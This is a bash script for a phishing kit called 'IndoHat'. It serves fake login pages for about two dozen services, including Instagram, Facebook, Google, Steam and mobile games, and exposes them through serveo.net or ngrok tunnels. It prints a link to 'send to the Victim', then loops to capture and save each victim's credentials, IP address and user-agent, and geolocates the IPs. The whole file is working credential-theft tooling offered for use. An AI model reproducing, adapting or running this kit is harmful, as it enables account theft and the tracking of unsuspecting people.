#!/usr/bin/bash
# Modern Phising The Indohat
# Coded by Senja
# Github: github.com/thesixtynine/IndoHat

checkroot() {

if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;77mPlease, run this program as root!\n\e[0m"
    exit 1
fi

}

checktor() {

check=$(curl --socks5-hostname localhost:9050 -s https://www.google.com > /dev/null; echo $?)

if [[ "$check" -gt 0 ]]; then
    printf "\e[1;77mPlease, check your TOR Connection! Just type \"tor\" or \"service tor start\"\n\e[0m"
    exit 1

fi

}

clearscreen() {

clear
reset
sleep 1

}

dependencies() {

command -v tor > /dev/null 2>&1 || { echo >&2 "I require tor but it's not installed. Run ./install.sh. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Run ./install.sh. Aborting."; exit 1; }
command -v openssl > /dev/null 2>&1 || { echo >&2 "I require openssl but it's not installed. Run ./install.sh Aborting."; exit 1; }

command -v awk > /dev/null 2>&1 || { echo >&2 "I require awk but it's not installed. Aborting."; exit 1; }
command -v sed > /dev/null 2>&1 || { echo >&2 "I require sed but it's not installed. Aborting."; exit 1; }
command -v cat > /dev/null 2>&1 || { echo >&2 "I require cat but it's not installed. Aborting."; exit 1; }
command -v tr > /dev/null 2>&1 || { echo >&2 "I require tr but it's not installed. Aborting."; exit 1; }
command -v wc > /dev/null 2>&1 || { echo >&2 "I require wc but it's not installed. Aborting."; exit 1; }
command -v cut > /dev/null 2>&1 || { echo >&2 "I require cut but it's not installed. Aborting."; exit 1; }
command -v uniq > /dev/null 2>&1 || { echo >&2 "I require uniq but it's not installed. Aborting."; exit 1; }

if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
echo "/dev/urandom not found!"
exit 1
fi

}

banner() {

printf "\n"
printf "\n"
printf "\e[0;31m  ██╗███╗   ██╗██████╗  ██████╗ \e[0;37m██╗  ██╗ █████╗ ████████╗\n\e[0m"
printf "\e[0;31m  ██║████╗  ██║██╔══██╗██╔═══██╗\e[0;37m██║  ██║██╔══██╗╚══██╔══╝\n\e[0m"
printf "\e[0;31m  ██║██╔██╗ ██║██║  ██║██║   ██║\e[0;37m███████║███████║   ██║   \n\e[0m"
printf "\e[0;31m  ██║██║╚██╗██║██║  ██║██║   ██║\e[0;37m██╔══██║██╔══██║   ██║   \n\e[0m"
printf "\e[0;31m  ██║██║ ╚████║██████╔╝╚██████╔╝\e[0;37m██║  ██║██║  ██║   ██║   \n\e[0m"
printf "\e[0;31m  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ \e[0;37m╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   \n\e[0m"
printf "\e[0;4;37m  ○● 千尺丨乇几ᗪ丂 ㄒ卄乇 Ꮆ尺卂ㄚ 卄卂ㄒ 爪ㄚ ㄒ乇卂爪 ●○\n\e[0m"
printf "\n"
printf "\n"

}

template() {

sleep 1
printf "\e[0m[\e[1;94m#\e[0m] \e[0mModern Phising The IndoHat\n\e[0m"
sleep 1
printf "\e[0m[\e[1;93m*\e[0m] \e[0mCoded by Senja\n\e[0"
sleep 1
printf "\e[0m[\e[1;96m&\e[0m] \e[0mMy Github: @thesixtynine\n\e[0m"
sleep 1

}

menu() {

printf "\n"
printf "\e[0m[\e[1;92m01\e[0m] \e[1;77mInstagram     \e[0m[\e[1;92m08\e[0m] \e[1;77mYahoo         \e[0m[\e[1;92m15\e[0m] \e[1;77mMicrosoft\n"
printf "\e[0m[\e[1;92m02\e[0m] \e[1;77mFacebook      \e[0m[\e[1;92m09\e[0m] \e[1;77mPinterest     \e[0m[\e[1;92m16\e[0m] \e[1;77mNetflix\n"
printf "\e[0m[\e[1;92m03\e[0m] \e[1;77mTwitter       \e[0m[\e[1;92m10\e[0m] \e[1;77mGitlab        \e[0m[\e[1;92m17\e[0m] \e[1;77mSpotify\n"
printf "\e[0m[\e[1;92m04\e[0m] \e[1;77mSnapchat      \e[0m[\e[1;92m11\e[0m] \e[1;77mLinkedin      \e[0m[\e[1;92m18\e[0m] \e[1;77mInstaFollow\n"
printf "\e[0m[\e[1;92m05\e[0m] \e[1;77mGoogle        \e[0m[\e[1;92m12\e[0m] \e[1;77mOrigin        \e[0m[\e[1;92m19\e[0m] \e[1;77mGameMobile\n"
printf "\e[0m[\e[1;92m06\e[0m] \e[1;77mWordpress     \e[0m[\e[1;92m13\e[0m] \e[1;77mGithub        \e[0m[\e[1;92m20\e[0m] \e[1;77mCustom\n"
printf "\e[0m[\e[1;92m07\e[0m] \e[1;77mProtonmail    \e[0m[\e[1;92m14\e[0m] \e[1;77mSteam         \e[0m[\e[1;92m00\e[0m] \e[1;77mExit\n"
printf "\n"

read -p $'\n\e[0m[\e[0m\e[95m/\e[0m\e[0m] Select an option: \e[0;1;77m\en' option

if [[ $option == 01 || $option == 1 ]]; then
server="instagram"
start1

elif [[ $option == 02 || $option == 2 ]]; then
server="facebook"
start1

elif [[ $option == 03 || $option == 3 ]]; then
server="twitter"
start1

elif [[ $option == 04 || $option == 4 ]]; then
server="snapchat"
start1

elif [[ $option == 05 || $option == 5 ]]; then
server="google"
start1

elif [[ $option == 06 || $option == 6 ]]; then
server="wordpress"
start1

elif [[ $option == 07 || $option == 7 ]]; then
server="protonmail"
start1

elif [[ $option == 08 || $option == 8 ]]; then
server="yahoo"
start1

elif [[ $option == 09 || $option == 9 ]]; then
server="pinterest"
start1

elif [[ $option == 10 ]]; then
server="gitlab"
start1

elif [[ $option == 11 ]]; then
server="linkedin"
start1

elif [[ $option == 12 ]]; then
server="origin"
start1

elif [[ $option == 13 ]]; then
server="github"
start1

elif [[ $option == 14 ]]; then
server="steam"
start1

elif [[ $option == 15 ]]; then
server="microsoft"
start1

elif [[ $option == 16 ]]; then
server="netflix"
start1

elif [[ $option == 17 ]]; then
server="spotify"
start1

elif [[ $option == 18 ]]; then
server="instafollow"
start1

elif [[ $option == 19 ]]; then
gamemobile

elif [[ $option == 20 ]]; then
server="create"
createfage
start1

elif [[ $option == 00 || $option == 0 ]]; then
echo
printf "\e[0m[\e[1;91m!\e[0m] \e[0;1;77mExit the program!\n\e[0m"
echo
sleep 1
exit 1

else
echo
printf "\e[0m[\e[1;91m!\e[0m] \e[0;1;77mInvalid option!\n\e[0m"
echo
sleep 1
clearscreen
banner
template
menu
fi

}

gamemobile() {

printf "\n"
printf "\e[0m[\e[1;94m01\e[0m] \e[1;77mMobileLegends \e[0m[\e[1;94m03\e[0m] \e[1;77mFreeFiere     \e[0m[\e[1;94m05\e[0m] \e[1;77mArenaOfValor\n"
printf "\e[0m[\e[1;94m02\e[0m] \e[1;77mClashOfClans  \e[0m[\e[1;94m04\e[0m] \e[1;77mPUBGMobile    \e[0m[\e[1;94m06\e[0m] \e[1;77mLordMobile\n"
printf "\n"

read -p $'\n\e[0m[\e[0m\e[93m+\e[0m\e[0m] Select an option: \e[0;1;77m\en' option

if [[ $option == 01 || $option == 1 ]]; then
server="mobilelegends"
start1

elif [[ $option == 02 || $option == 2 ]]; then
server="clashofclans"
start1

elif [[ $option == 03 || $option == 3 ]]; then
server="freefiere"
start1

elif [[ $option == 04 || $option == 4 ]]; then
server="pubgmobile"
start1

elif [[ $option == 05 || $option == 5 ]]; then
server="arenaofvalor"
start1

elif [[ $option == 06 || $option == 6 ]]; then
server="lordmobile"
start1

else
echo
printf "\e[0m[\e[1;91m!\e[0m] \e[0;1;77mInvalid option!\n\e[0m"
echo
sleep 1
clearscreen
banner
template
menu
fi

}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)

if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi

if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi

if [[ -e sendlink ]]; then
rm -rf sendlink
fi

}

createpage() {

default_cap1="Wi-fi Session Expired"
default_cap2="Please login again."
default_user_text="Username:"
default_pass_text="Password:"
default_sub_text="Log-In"

read -p $'\e[0m[\e[1;92m*\e[0m] \e[0;1;77mTitle 1 \e[0m(Default: Wi-fi Session Expired): \e[0;1;77m' cap1
cap1="${cap1:-${default_cap1}}"

read -p $'\e[0m[\e[1;93m*\e[0m] \e[0;1;77mTitle 2 \e[0m(Default: Please login again.): \e[0;1;77m' cap2
cap2="${cap2:-${default_cap2}}"

read -p $'\e[0m[\e[1;94m*\e[0m] \e[0;1;77mUsername field \e[0m(Default: Username:): \e[0;1;77m' user_text
user_text="${user_text:-${default_user_text}}"

read -p $'\e[0m[\e[1;95m*\e[0m] \e[0;1;77mPassword field \e[0m(Default: Password:): \e[0;1;77m' pass_text
pass_text="${pass_text:-${default_pass_text}}"

read -p $'\e[0m[\e[1;96m*\e[0m] \e[0;1;77mSubmit field \e[0m(Default: Log-In): \e[0;1;77m' sub_text
sub_text="${sub_text:-${default_sub_text}}"

echo "<!DOCTYPE html>" > sites/create/login.html
echo "<html>" >> sites/create/login.html
echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
IFS=$'\n'
printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
IFS=$'\n'
printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
IFS=$'\n'
printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
IFS=$'\n'
printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
printf '</center>' >> sites/create/login.html
printf '<body>\n' >> sites/create/login.html
printf '</html>\n' >> sites/create/login.html

}

catch_cred() {

account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
printf "\e[0m[\e[1;94m#\e[0m] Account:\e[0;1;77m %s\n\e[0m" $account
printf "\e[0m[\e[1;96m*\e[0m] Password:\e[0;1;77m %s\n\e[0m" $password
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
printf "\e[0m[\e[1;95m+\e[0m] Saved:\e[0;1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
printf "\n"
printf "\e[0m[\e[1;91m!\e[0m] Waiting Next IP and Next Credentials, \e[0;1;77mPress Ctrl + C to exit...\e[0m\n"

}

catch_ip() {

touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
printf "\e[0m[\e[1;94m#\e[0m] Victim IP:\e[0;1;77m %s\e[0m\n" $ip
printf "\e[0m[\e[1;93m*\e[0m] User-Agent:\e[0;1;77m %s\e[0m\n" $ua
printf "\e[0m[\e[1;96m&\e[0m] Saved:\e[0;1;77m %s/saved.ip.txt\e[0m\n" $server
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt

if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[0m[\e[1;96m*\e[0m] \e[0;1;77mHostname:\e[0m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[0m[\e[1;95m*\e[0m] \e[0;1;77mReverse DNS:\e[0m %s\e[0m\n" $reverse_dns
fi
##

if [[ $continent != "" ]]; then
printf "\e[0m[\e[1;94m*\e[0m] \e[0;1;77mIP Continent:\e[0m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[0m[\e[1;93m*\e[0m] \e[0;1;77mIP Country:\e[0m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[0m[\e[1;92m*\e[0m] \e[0;1;77mState:\e[0m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[0m[\e[1;91m*\e[0m] \e[0;1;77mCity Location:\e[0m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[0m[\e[1;96m*\e[0m] \e[0;1;77mISP:\e[0m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[0m[\e[1;95m*\e[0m] \e[0;1;77mAS Number:\e[0m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[0m[\e[1;94m*\e[0m] \e[0;1;77mIP Address Speed:\e[0m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[0m[\e[1;93m*\e[0m] \e[0;1;77mIP Currency:\e[0m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log
printf "\e[0m[\e[1;91m!\e[0m] Waiting Credentials and Next IP,\n\e[0m"
printf "    \e[0;1;77mPress Ctrl + C to exit...\e[0m\n"

}

serverx() {

printf "\e[0m[\e[1;96m*\e[0m] \e[0;1;77mStarting php server...\n\e[0m"
cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m[\e[1;95m*\e[0m] \e[0;1;77mStarting server...\e[0m\n"
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }

if [[ -e sendlink ]]; then
rm -rf sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
printf "\n"
sleep 10
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\n"
printf '\n\e[0m[\e[1;94m*\e[0m] Send the direct link:\e[0m\e[1;77m %s \n' $send_link
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
printf '\n\e[0m[\e[1;93m*\e[0m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
checkfound

}

startx() {

if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt
fi

if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt
fi

default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
printf '\e[0m[\e[1;94m+\e[0m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;77m): \e[0m' $default_port
read port
port="${port:-${default_port}}"
serverx

}

start() {

if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt
fi

if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt
fi

if [[ -e ngrok ]]; then
echo ""

else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)

if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip

else
printf "\e[0m[\e[1;91m!\e[0m] \e[0;1;77mDownload error... Termux, run:\e[0m pkg install wget\e[0m\n"
exit 1
fi

else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 

if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip

else
printf "\e[0m[\e[1;91m!\e[0m] \e[0;1;77mDownload error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[0m[\e[1;92m*\e[0m] \e[0;1;77mStarting php server...\n\e[0m"
cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
printf "\e[0m[\e[1;95m*\e[0m] \e[0;1;77mStarting ngrok server...\n\e[0m"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[0m[\e[1;94m#\e[0m] Send this link to the Victim:\e[0;1;77m %s\e[0m\n" $link
checkfound

}

start1() {

if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[0m[\e[1;96m1\e[0m] \e[0;1;77mServeo.net (SSH Tunneling, Best!)\e[0m\n"
printf "\e[0m[\e[1;96m2\e[0m] \e[0;1;77mNgrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[0m[\e[1;93m+\e[0m] Choose a Port Forwarding option: \e[0;1;77m\en' option_server
option_server="${option_server:-${default_option_server}}"

if [[ $option_server == 1 || $option_server == 01 ]]; then
startx

elif [[ $option_server == 2 || $option_server == 02 ]]; then
start

else
printf "\e[0m[\e[1;91m!\e[0m] \e[0;1;77mInvalid option!\e[0m\n"
sleep 1
clear
start1
fi

}

checkfound() {

printf "\n"
printf "\e[0m[\e[1;91m!\e[0m] Waiting IPs and Credentials, \e[0;1;77mPress Ctrl + C to exit...\e[0m\n"
while [ true ]; do

if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n\e[0m[\e[1;92m*\e[0m] \e[0;1;77mIP Found!\n"
catch_ip
rm -rf sites/$server/ip.txt
fi
sleep 0.5

if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[0m[\e[1;91m!\e[0m] \e[0;1;77mCredentials Found!\n"
catch_cred
rm -rf sites/$server/usernames.txt
fi
sleep 0.5
done

}

#checkroot
#checktor
#dependencies
clearscreen
banner
template
menu
